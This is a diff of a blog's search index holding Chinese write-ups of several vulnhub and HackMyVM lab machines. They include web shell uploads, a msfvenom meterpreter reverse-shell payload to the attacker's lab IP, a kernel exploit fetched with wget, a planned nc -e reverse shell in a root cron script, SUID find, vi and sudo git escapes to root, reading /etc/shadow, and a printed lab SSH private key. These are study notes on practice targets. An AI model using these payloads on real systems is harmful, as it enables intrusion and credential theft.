@@ -32,14 +32,13 @@
       </tags>
   </entry>
   <entry>
-    <title>DC3靶场复盘</title>
-    <url>/posts/35983.html</url>
-    <content><![CDATA[<p>vulnhub-DC3靶场复盘</p>
+    <title>DC1靶场复盘</title>
+    <url>/posts/52872.html</url>
+    <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
 <span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a237dd0e0a243d4f8768f.png" alt="|450"><br>nmap扫描这个端口之后 可以得到一些更重要的信息   比如这个网站用的cms是joomla<br>用searchsploit可以发现有非常多的漏洞  百度之后发现有一个扫描器 joomscan</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87690.png" alt="|450"><br>web界面只有一个登录界面 可以尝试直接爆破 但是从结果来说 确实可以爆破 而且账户也存在<br>但是这里不是实际的管理界面<br><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87691.png"><br>用joomscan可以找到真实的管理员登录界面   我们用password.lst 爆破可以得到密码<br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87692.png" alt="|475"><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|500"><br>这个管理界面没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a23e3d0e0a243d4f8769b.png" alt="|475"><br>在模板中 可以看到php文件 我们可以在index.php中直接插入php代码  比如phpinfo() 到网站首页之后发现成功了<br>（这里如果要在index中插入必须要是用的和网站现在用的模板一样才可以  如果在html文件夹里面插入就不用管<br>然后上传php一句话木马 用蚁剑连接 拿到webshell<br>但是这里没有nc指令 我们要用到msfconsole<br> 先输入msfconsole进入命令面板   <code>use payload/php/meterpreter/reverse_tcp</code><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|450"><br>然后需要用<mark>msfvenom</mark>生成攻击文件<br>  <code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.240.11 lport=1234 &gt; a.php </code><br>接着回到msfconsole  用 <code>use exploit/multi/handler</code>  这是一个监听器  然后设置payload  <code>set payload php/meterpreter/reverse_tcp</code><br>show options 查看需要配置什么<br> <code>set lhost 192.168.240.11</code>  <code>set lpost 1234</code>   最后run就可以了<br>在web界面刷新刚才插入payload php代码的界面  就可以在msf中看到成功连接了<br><img src="https://pic1.imgdb.cn/item/679a23e5d0e0a243d4f8769d.png" alt="|500"><br>输入shell 进入</p>
-<h3 id="2用joomla漏洞-非爆破"><a href="#2用joomla漏洞-非爆破" class="headerlink" title="2用joomla漏洞 (非爆破)"></a>2用joomla漏洞 (非爆破)</h3><p>用searchsploit 搜索joomla + 版本号<br>这个脚本告诉我们了sqlmap使用的sqlmap<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a2.png"><br>到columns这里要注意一点 这里用自动就什么都没有  而且因为这个表名有# 有用引号括起来<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a3.png" alt="|500"><br>同样可以得到这个密码</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以做一些常规的操作比如suid  系统漏洞等  suid没有可以利用的 但是系统比较老 可以用内核提权<br>.linux系统漏洞提权<br>先在webshell里面用<code>cat /etc/*releas</code> 得到当前ubuntu系统的版本号  DISTRIB_RELEASE&#x3D;16.04<br><code>uname -a</code> 查看内核版本   Linux DC-3 4.4.0-21-generic<br>然后用searchsploit 找到漏洞利用脚本（必须同时满足系统和内核版本）  这里给的网址已经失效 需要我们去仓库 找到新的地方<br>把下载下来的文件用scp复制到kali 的&#x2F;var&#x2F;www&#x2F;html中  然后在webshell用wget下载这个利用脚本<br>解压之后 运行脚本就可以提权了<br><img src="https://pic1.imgdb.cn/item/679a23e6d0e0a243d4f8769f.png" alt="|475"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2905d0e0a243d4f8771d.png" alt="|500"><br>这个靶机用的是drupal    还可以下载droopescan扫描器   网上教程是用pip3安装但是我的版本无法用这个安装 需要下载pipx 并且要用bash <code>pipx ensurepath</code>  用虚拟环境 来运行<code>python3 -m venv droopescan-env; source droopescan-env/bin/activate</code></p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>用 wapp可以得到drupal的版本号<br><img src="https://pic1.imgdb.cn/item/679a2948d0e0a243d4f87727.png" alt="|375">&#96;<br>用searchsploit查看druptal的漏洞<br><img src="https://pic1.imgdb.cn/item/679a2909d0e0a243d4f8771e.png"><br>这里利用这个add admin的脚本 -t -u -p 添加一个管理员账户<br>接着仿照以前的经验 下载php插件   在文章中插入php 代码 拿到webshell<br><img src="https://pic1.imgdb.cn/item/679a290ad0e0a243d4f8771f.png"><br><img src="https://pic1.imgdb.cn/item/679a290dd0e0a243d4f87721.png" alt="|500"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看suid<br><img src="https://pic1.imgdb.cn/item/679a290cd0e0a243d4f87720.png"><br>发现find指令有suid   所以可以利用find  后面执行一个命令 比如我们用 -exec cat &#x2F;etc&#x2F;shadow \; 看  后面要加反斜杠和封号告诉find后面不用再解析命令了   这样可以用root执行命令 拿到flag<br>法二：拿到flag4用户的hash之后 用john破解 登录到flag4用户  用find提权<br><mark>find提权</mark> -exec ‘&#x2F;bin&#x2F;sh’ \;  解决</p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -51,13 +50,33 @@
       </tags>
   </entry>
   <entry>
-    <title>DC1靶场复盘</title>
-    <url>/posts/52872.html</url>
-    <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
+    <title>DC2靶场复盘</title>
+    <url>/posts/3469.html</url>
+    <content><![CDATA[<p>vulnhub-DC2靶场复盘</p>
 <span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2905d0e0a243d4f8771d.png" alt="|500"><br>这个靶机用的是drupal    还可以下载droopescan扫描器   网上教程是用pip3安装但是我的版本无法用这个安装 需要下载pipx 并且要用bash <code>pipx ensurepath</code>  用虚拟环境 来运行<code>python3 -m venv droopescan-env; source droopescan-env/bin/activate</code></p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>用 wapp可以得到drupal的版本号<br><img src="https://pic1.imgdb.cn/item/679a2948d0e0a243d4f87727.png" alt="|375">&#96;<br>用searchsploit查看druptal的漏洞<br><img src="https://pic1.imgdb.cn/item/679a2909d0e0a243d4f8771e.png"><br>这里利用这个add admin的脚本 -t -u -p 添加一个管理员账户<br>接着仿照以前的经验 下载php插件   在文章中插入php 代码 拿到webshell<br><img src="https://pic1.imgdb.cn/item/679a290ad0e0a243d4f8771f.png"><br><img src="https://pic1.imgdb.cn/item/679a290dd0e0a243d4f87721.png" alt="|500"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看suid<br><img src="https://pic1.imgdb.cn/item/679a290cd0e0a243d4f87720.png"><br>发现find指令有suid   所以可以利用find  后面执行一个命令 比如我们用 -exec cat &#x2F;etc&#x2F;shadow \; 看  后面要加反斜杠和封号告诉find后面不用再解析命令了   这样可以用root执行命令 拿到flag<br>法二：拿到flag4用户的hash之后 用john破解 登录到flag4用户  用find提权<br><mark>find提权</mark> -exec ‘&#x2F;bin&#x2F;sh’ \;  解决</p>
+<p>先根据提示 修改host</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2562d0e0a243d4f876b9.png" alt="|275"><br>扫描的结果显示只有一个80端口 但是实际上有一个ssh端口 用-p-扫描所有端口  7744</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a2563d0e0a243d4f876ba.png" alt="|900"><br>页面上有一个flag提示要用到cewl扫描 然后用扫描出来的内容当作爆破的字典 <code>cewl -w pass.txt http://dc-2/</code><br>这个是一个wordpress cms   我们可以用wpscan扫一下用户名<br><code>wpscan --url http://dc-2/ --enumerate u</code><br>得到两个用户名 tom和jerry<br>然后用bp爆破  得到两个账户  我们分别登录到这两个账户<br><img src="https://pic1.imgdb.cn/item/679a2565d0e0a243d4f876bb.png" alt="|725"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bc.png" alt="|925"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bd.png" alt="|500"><br>找到了flag2 我们用ssh 登录 这个flag 在jerry账户找到的 用tom登录ssh<br><img src="https://pic1.imgdb.cn/item/679a25b3d0e0a243d4f876c4.png" alt="|475"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a25b4d0e0a243d4f876c5.png"><br>发现了不是普通bash 是rbash  命令受限制<br><img src="https://pic1.imgdb.cn/item/679a25b5d0e0a243d4f876c6.png"><br>查看可以执行的命令<br>这里我们用vi逃逸 : 进入vi之后输入 :set shell&#x3D;&#x2F;bin&#x2F;bash :shell  再修改一下环境 export PATH&#x3D;’&#x2F;usr&#x2F;bin:&#x2F;bin’<br> 执行 <code>cat /etc/passwd</code> 可以看到还有一个jerry 的账户 我们用su切换到jerry<br> 发现jerry可以用root权限执行 git  现在用git提权<br> <img src="https://pic1.imgdb.cn/item/679a25b7d0e0a243d4f876c7.png"><br> <code>sudo git help config !/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</code> </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC3靶场复盘</title>
+    <url>/posts/35983.html</url>
+    <content><![CDATA[<p>vulnhub-DC3靶场复盘</p>
+<span id="more"></span>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a237dd0e0a243d4f8768f.png" alt="|450"><br>nmap扫描这个端口之后 可以得到一些更重要的信息   比如这个网站用的cms是joomla<br>用searchsploit可以发现有非常多的漏洞  百度之后发现有一个扫描器 joomscan</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87690.png" alt="|450"><br>web界面只有一个登录界面 可以尝试直接爆破 但是从结果来说 确实可以爆破 而且账户也存在<br>但是这里不是实际的管理界面<br><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87691.png"><br>用joomscan可以找到真实的管理员登录界面   我们用password.lst 爆破可以得到密码<br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87692.png" alt="|475"><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|500"><br>这个管理界面没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a23e3d0e0a243d4f8769b.png" alt="|475"><br>在模板中 可以看到php文件 我们可以在index.php中直接插入php代码  比如phpinfo() 到网站首页之后发现成功了<br>（这里如果要在index中插入必须要是用的和网站现在用的模板一样才可以  如果在html文件夹里面插入就不用管<br>然后上传php一句话木马 用蚁剑连接 拿到webshell<br>但是这里没有nc指令 我们要用到msfconsole<br> 先输入msfconsole进入命令面板   <code>use payload/php/meterpreter/reverse_tcp</code><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|450"><br>然后需要用<mark>msfvenom</mark>生成攻击文件<br>  <code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.240.11 lport=1234 &gt; a.php </code><br>接着回到msfconsole  用 <code>use exploit/multi/handler</code>  这是一个监听器  然后设置payload  <code>set payload php/meterpreter/reverse_tcp</code><br>show options 查看需要配置什么<br> <code>set lhost 192.168.240.11</code>  <code>set lpost 1234</code>   最后run就可以了<br>在web界面刷新刚才插入payload php代码的界面  就可以在msf中看到成功连接了<br><img src="https://pic1.imgdb.cn/item/679a23e5d0e0a243d4f8769d.png" alt="|500"><br>输入shell 进入</p>
+<h3 id="2用joomla漏洞-非爆破"><a href="#2用joomla漏洞-非爆破" class="headerlink" title="2用joomla漏洞 (非爆破)"></a>2用joomla漏洞 (非爆破)</h3><p>用searchsploit 搜索joomla + 版本号<br>这个脚本告诉我们了sqlmap使用的sqlmap<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a2.png"><br>到columns这里要注意一点 这里用自动就什么都没有  而且因为这个表名有# 有用引号括起来<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a3.png" alt="|500"><br>同样可以得到这个密码</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以做一些常规的操作比如suid  系统漏洞等  suid没有可以利用的 但是系统比较老 可以用内核提权<br>.linux系统漏洞提权<br>先在webshell里面用<code>cat /etc/*releas</code> 得到当前ubuntu系统的版本号  DISTRIB_RELEASE&#x3D;16.04<br><code>uname -a</code> 查看内核版本   Linux DC-3 4.4.0-21-generic<br>然后用searchsploit 找到漏洞利用脚本（必须同时满足系统和内核版本）  这里给的网址已经失效 需要我们去仓库 找到新的地方<br>把下载下来的文件用scp复制到kali 的&#x2F;var&#x2F;www&#x2F;html中  然后在webshell用wget下载这个利用脚本<br>解压之后 运行脚本就可以提权了<br><img src="https://pic1.imgdb.cn/item/679a23e6d0e0a243d4f8769f.png" alt="|475"></p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -83,25 +102,6 @@
 <li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
 <li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
 </ul>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC2靶场复盘</title>
-    <url>/posts/3469.html</url>
-    <content><![CDATA[<p>vulnhub-DC2靶场复盘</p>
-<span id="more"></span>
-<p>先根据提示 修改host</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a2562d0e0a243d4f876b9.png" alt="|275"><br>扫描的结果显示只有一个80端口 但是实际上有一个ssh端口 用-p-扫描所有端口  7744</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a2563d0e0a243d4f876ba.png" alt="|900"><br>页面上有一个flag提示要用到cewl扫描 然后用扫描出来的内容当作爆破的字典 <code>cewl -w pass.txt http://dc-2/</code><br>这个是一个wordpress cms   我们可以用wpscan扫一下用户名<br><code>wpscan --url http://dc-2/ --enumerate u</code><br>得到两个用户名 tom和jerry<br>然后用bp爆破  得到两个账户  我们分别登录到这两个账户<br><img src="https://pic1.imgdb.cn/item/679a2565d0e0a243d4f876bb.png" alt="|725"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bc.png" alt="|925"><br><img src="https://pic1.imgdb.cn/item/679a2566d0e0a243d4f876bd.png" alt="|500"><br>找到了flag2 我们用ssh 登录 这个flag 在jerry账户找到的 用tom登录ssh<br><img src="https://pic1.imgdb.cn/item/679a25b3d0e0a243d4f876c4.png" alt="|475"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a25b4d0e0a243d4f876c5.png"><br>发现了不是普通bash 是rbash  命令受限制<br><img src="https://pic1.imgdb.cn/item/679a25b5d0e0a243d4f876c6.png"><br>查看可以执行的命令<br>这里我们用vi逃逸 : 进入vi之后输入 :set shell&#x3D;&#x2F;bin&#x2F;bash :shell  再修改一下环境 export PATH&#x3D;’&#x2F;usr&#x2F;bin:&#x2F;bin’<br> 执行 <code>cat /etc/passwd</code> 可以看到还有一个jerry 的账户 我们用su切换到jerry<br> 发现jerry可以用root权限执行 git  现在用git提权<br> <img src="https://pic1.imgdb.cn/item/679a25b7d0e0a243d4f876c7.png"><br> <code>sudo git help config !/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell</code> </p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -152,6 +152,27 @@
       </tags>
   </entry>
   <entry>
+    <title>DC7靶场复盘</title>
+    <url>/posts/51728.html</url>
+    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
+<span id="more"></span>
+<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
+<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
+<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC8靶场复盘</title>
     <url>/posts/51727.html</url>
     <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
@@ -189,6 +210,32 @@
       </tags>
   </entry>
   <entry>
+    <title>HMV-Baseme</title>
+    <url>/posts/46022.html</url>
+    <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f9d0e0a243d4f878d0.png"></p>
+<h1 id="Baseme"><a href="#Baseme" class="headerlink" title="Baseme"></a>Baseme</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3980d0e0a243d4f87970.png" alt="|500"><br>开放了22端口和80端口</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>web给了一行base64加密过的文本  得到一个用户名 lucas<br><img src="https://pic1.imgdb.cn/item/679a3983d0e0a243d4f87971.png" alt="|425"><br>提示这个靶机全部用的是base64<br><img src="https://pic1.imgdb.cn/item/679a3985d0e0a243d4f87972.png" alt="|350"><br>还给了一些密码字典  我们存储并且进行base64</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> pass);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">base64</span> &gt;&gt; pass.txt;<span class="keyword">done</span> </span><br><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="built_in">cat</span> pass.txt     </span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure></div>
+<p>然后再进行目录爆破<br>用gobuster midium字典爆破之后还是没有发现有用的目录   换dirb&#x2F;common.txt字典<br>还是没有找到任何有用的信息  这里的字典要再用base64进行编码然后爆破  找到了两个目录<br><img src="https://pic1.imgdb.cn/item/679a3989d0e0a243d4f87974.png"><br>curl访问得到一串base64编码  解密之后得到是rsa密钥 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line"><span class="number">07</span>jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL<span class="symbol">/ptLk26RBnh</span></span><br><span class="line"><span class="number">7</span>bHG1JjGlxOkO6m<span class="operator">+</span><span class="number">1</span>oFNLtNuD2QPl8sbZtEzX4S9nNZ<span class="symbol">/dpyRpMfmB73rN3yyIylevVDEyv</span></span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq<span class="operator">+</span>b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj<span class="symbol">/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span></span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM<span class="operator">+</span><span class="number">3</span>mzWjPdoBK<span class="symbol">/Ho339uPmBWI5sbMrpK</span></span><br><span class="line">xkZMnl<span class="operator">+</span>rcTbgz4swv8gNuKhUc7wTgtrNX<span class="operator">+</span>PNMdIALNpsxYLt<span class="symbol">/l56GK8R4J8fLIU5+MojRs</span></span><br><span class="line"><span class="operator">+</span><span class="number">1</span>NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp<span class="operator">+</span>YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4<span class="operator">+</span>dW7nZ</span><br><span class="line">zjf3p0M77b<span class="symbol">/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span></span><br><span class="line">IJh<span class="operator">+</span>I<span class="operator">+</span>Zv1egSMS<span class="symbol">/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span></span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5<span class="symbol">/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span></span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS<span class="operator">+</span><span class="symbol">/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span></span><br><span class="line"><span class="operator">+</span><span class="number">8</span>gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ<span class="symbol">/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span></span><br><span class="line">tSn7hr8hppT2tUSxDvC<span class="operator">+</span>USMmw<span class="symbol">/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span></span><br><span class="line">N7bw45FhBZCsHCAbV2<span class="operator">+</span>hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif<span class="symbol">/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span></span><br><span class="line">O<span class="operator">+</span>TowA10RATek6ZEIxh6SmtDG<span class="symbol">/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span></span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span><span class="symbol">/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span></span><br><span class="line">ND8ikgmQvF6hrwwJBrp<span class="symbol">/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span></span><br><span class="line">LdmmRXUS<span class="operator">/</span>DtO<span class="operator">+</span><span class="number">69</span><span class="operator">/</span>aidvxGAYob<span class="operator">+</span><span class="number">1</span>M<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
+<p>尝试使用ssh登录<br><img src="https://pic1.imgdb.cn/item/679a3988d0e0a243d4f87973.png"><br>发现不能直接登录 根据提示执行 <code> ssh-keygen -f &#39;/root/.ssh/known_hosts&#39; -R &#39;192.168.240.45&#39;</code><br>然后需要密码  用一开始得到的几个密码的base64编码进行尝试  发现用第一个就能登录<br><img src="https://pic1.imgdb.cn/item/679a3c2cd0e0a243d4f879d4.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>查找有没有suid提权</p>
